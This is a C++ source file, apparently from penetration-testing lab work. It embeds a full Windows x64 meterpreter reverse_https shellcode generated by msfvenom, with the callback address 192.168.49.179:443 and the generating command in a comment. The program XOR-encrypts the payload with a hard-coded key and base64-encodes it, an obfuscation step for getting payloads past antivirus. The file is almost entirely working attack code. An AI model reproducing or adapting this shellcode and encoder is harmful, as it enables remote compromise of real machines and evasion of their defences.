#include <iostream>
#include "base64.h"
using namespace std;


int main()
{
		/*
		root@kali:/home/cosmic# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.179 LPORT=443 EXITFUNC=thread -f C
		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
		[-] No arch selected, selecting arch: x64 from the payload
		No encoder specified, outputting raw payload
		Payload size: 586 bytes
		Final size of c file: 2494 bytes

		*/
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
		"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x8b\x48\x18\x50\x49"
		"\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
		"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
		"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
		"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
		"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
		"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
		"\x00\x00\xff\xd5\xe8\x0f\x00\x00\x00\x31\x39\x32\x2e\x31"
		"\x36\x38\x2e\x34\x39\x2e\x31\x37\x39\x00\x5a\x48\x89\xc1"
		"\x49\xc7\xc0\xbb\x01\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03"
		"\x53\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8"
		"\x1f\x00\x00\x00\x2f\x57\x35\x73\x39\x46\x62\x45\x4c\x4d"
		"\x65\x47\x53\x33\x5a\x50\x66\x38\x55\x4c\x57\x74\x67\x43"
		"\x71\x59\x35\x43\x74\x58\x00\x48\x89\xc1\x53\x5a\x41\x58"
		"\x4d\x31\xc9\x53\x48\xb8\x00\x32\xa8\x84\x00\x00\x00\x00"
		"\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff\xd5\x48\x89"
		"\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a\x1f\x5a\x52\x68\x80\x33"
		"\x00\x00\x49\x89\xe0\x6a\x04\x41\x59\x49\xba\x75\x46\x9e"
		"\x86\x00\x00\x00\x00\xff\xd5\x4d\x31\xc0\x53\x5a\x48\x89"
		"\xf1\x4d\x31\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06"
		"\x18\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00"
		"\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5\x48"
		"\xff\xcf\x74\x02\xeb\xaa\xe8\x55\x00\x00\x00\x53\x59\x6a"
		"\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0\x00\x10\x00"
		"\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00\xff\xd5\x48"
		"\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x49\xc7"
		"\xc0\x00\x20\x00\x00\x49\x89\xf9\x49\xba\x12\x96\x89\xe2"
		"\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb2"
		"\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd2\x58\xc3\x58\x6a"
		"\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5";

	unsigned char encrypted[sizeof(shellcode)];
	//unsigned char encrypted2[sizeof(shellcode)];

	unsigned char key[] = "Sup3rS3cr3t!";
	printf("test");
	printf("Original Shellcode:\n");
	for (int i = 0; i < sizeof(shellcode)-1; i++) {
		encrypted[i] = shellcode[i] ^ key[i%(sizeof(key)-1)];
		printf("\\x%02x", shellcode[i] & 0xff);
	}

	
	printf("\nEncrypted Shellcode:\n");
	for (int i = 0; i < sizeof(encrypted) - 1; i++) {
		printf("\\x%02x", encrypted[i] & 0xff);
		//printf("%02x", encrypted[i] & 0xff);
	}
	

	/*
	printf("\nVerifying Original Shellcode:\n");
	for (int i = 0; i < sizeof(encrypted) - 1; i++) {
	    shellcode[i] = encrypted[i] ^ key[i % (sizeof(key) - 1)];
		printf("\\%02x", shellcode[i] & 0xff);

	}
	*/
	
	int len = sizeof(encrypted);
    int max_encoded_length = Base64encode_len(len);
	char* encoded = new char[max_encoded_length];
	int result = Base64encode(encoded, (const char*)encrypted, len);
	printf("\nEncoded Shellcode:\n");
	printf("%s", encoded);

	//len = sizeof(encoded);
	//int max_decoded_length = Base64decode_len(encoded);
	//char* encrypted2 = new char[sizeof(encrypted)];


	/*
	result = Base64decode((char *)encrypted2, encoded);
	printf("\nDecoded Shellcode:\n");
	for (int i = 0; i < sizeof(encrypted2) - 1; i++) {
		printf("\\x%02x", encrypted2[i] & 0xff);
	}
	*/




}
